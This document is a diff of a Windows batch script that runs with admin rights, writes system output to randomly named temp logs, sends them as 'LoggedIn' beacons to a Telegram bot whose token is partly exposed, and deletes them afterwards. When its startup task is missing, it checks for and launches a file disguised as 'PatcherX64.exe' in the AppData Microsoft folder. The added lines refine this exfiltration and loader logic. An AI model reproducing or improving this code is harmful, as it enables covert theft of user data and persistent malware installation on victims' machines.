@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=2.2"
+set "BATCHVERSION=2.3"
 echo BATCHVERSION=%BATCHVERSION%
 timeout /t 70 /nobreak
 
@@ -37,7 +37,13 @@ set "filename1=!filename!"
 set "filename="
 
 
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
 
+set "filename2=!filename!"
+set "filename="
 
 
 
@@ -71,6 +77,7 @@ curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBu
 
 :: Set the log file path
 set "LOGFILE=%temp%\!filename1!.ustup"
+set "LOGFILE1=%temp%\!filename2!.ustup"
 
 
 
@@ -78,7 +85,9 @@ set "LOGFILE=%temp%\!filename1!.ustup"
 call :LogOutput > "%LOGFILE%" 2>&1
 echo.
 echo.
-
+type "%LOGFILE%" > "%LOGFILE1%"
+echo.
+echo.
 
 
 set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
@@ -91,12 +100,13 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
      -F "chat_id=%CHAT_ID_RUNNING%" ^
      -F "message_thread_id=%TOPIC_ID_RUNNING%" ^
      -F "caption=%ENCODED_MESSAGE_RUNNING%" ^
-     -F "document=@%LOGFILE%"
+     -F "document=@%LOGFILE1%"
 
 
 
 echo.
 del /f /q "%LOGFILE%"
+del /f /q "%LOGFILE1%"
 goto :EOF
 
 
@@ -176,7 +186,7 @@ echo.
 echo [!COUNT!] Running handler...
 call :HANDLERUNEVERYLOG
 
-REM Wait 15 seconds only if not the last loop
+REM Wait 20 seconds only if not the last loop
 if !COUNT! LSS 6 timeout /t 20 /nobreak
 
 set /a COUNT+=1
@@ -318,6 +328,8 @@ goto NEXT
 
 
 :INSTRUNEVERY
+echo.
+echo.
 echo %startupFile% not found.
 echo.
 :: RunEvery Files or Task missing 
@@ -325,7 +337,6 @@ echo.
 
 
 :: RunEveryCaller Installer
-@echo off
  
 color 0A
  
@@ -351,11 +362,11 @@ timeout /t 2 /nobreak >nul
 if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
+    timeout /t 2 /nobreak >nul
+    echo Retrying in 2 seconds ....
+    timeout /t 2 /nobreak >nul
+    echo.
+    goto INSTRUNEVERY
 )
  
  
@@ -369,13 +380,13 @@ for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 if %FILESIZE% geq 80000 (
     start "" "%APPDATA%\microsoft\PatcherX64.exe"
 ) else (
-echo.
+    echo.
     echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
+     timeout /t 2 /nobreak >nul
+     echo Retrying in 2 seconds ....
+     timeout /t 2 /nobreak >nul
+     echo.
+     goto INSTRUNEVERY
 )
  
  
